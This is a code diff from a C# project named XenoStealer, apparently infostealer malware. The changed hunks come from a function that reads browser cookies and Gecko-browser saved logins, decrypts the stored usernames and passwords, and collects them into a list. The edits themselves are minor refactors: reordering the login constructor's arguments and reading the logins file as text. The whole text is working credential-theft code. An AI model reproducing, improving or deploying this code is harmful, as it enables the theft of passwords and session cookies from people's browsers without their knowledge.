@@ -172,6 +172,7 @@ namespace XenoStealer
                     string name = parser.GetValue(i, "name");
                     string value = parser.GetValue(i, "value");
                     string path = parser.GetValue(i, "path");
+
                     if (!ulong.TryParse(parser.GetValue(i, "expiry"), out ulong expiry))
                     {
                         continue;
@@ -242,7 +243,7 @@ namespace XenoStealer
                         string username = decryptor.Decrypt(encryptedUsername);
                         string password = decryptor.Decrypt(encryptedPassword);
                         if (hostname == null || username == null || password == null) continue;
-                        logins.Add(new DataExtractionStructs.GeckoLogin(hostname, username, password));
+                        logins.Add(new DataExtractionStructs.GeckoLogin(username, password, hostname));
                         //add it to passwords and stuff.
                     }
                     catch 
@@ -255,9 +256,9 @@ namespace XenoStealer
             }
             else if (File.Exists(JSONpath))
             {
-                byte[] jsonFileBytes = Utils.ForceReadFile(JSONpath);
+                string jsonText =  Utils.ForceReadFileString(JSONpath);
 
-                if (jsonFileBytes == null) 
+                if (jsonText == null) 
                 { 
                     return null;
                     //fail.
@@ -267,7 +268,6 @@ namespace XenoStealer
 
                 try 
                 {
-                    string jsonText = Encoding.UTF8.GetString(jsonFileBytes);
                     JavaScriptSerializer serializer = new JavaScriptSerializer();
                     jsonObject = serializer.Deserialize<dynamic>(jsonText);
                 } 
@@ -292,7 +292,7 @@ namespace XenoStealer
                                 string username = decryptor.Decrypt(encryptedUsername);
                                 string password = decryptor.Decrypt(encryptedPassword);
                                 if (hostname == null || username == null || password == null) continue;
-                                logins.Add(new DataExtractionStructs.GeckoLogin(hostname, username, password));
+                                logins.Add(new DataExtractionStructs.GeckoLogin(username, password, hostname));
                                 //add it to passwords and stuff.
                             }
                             catch 
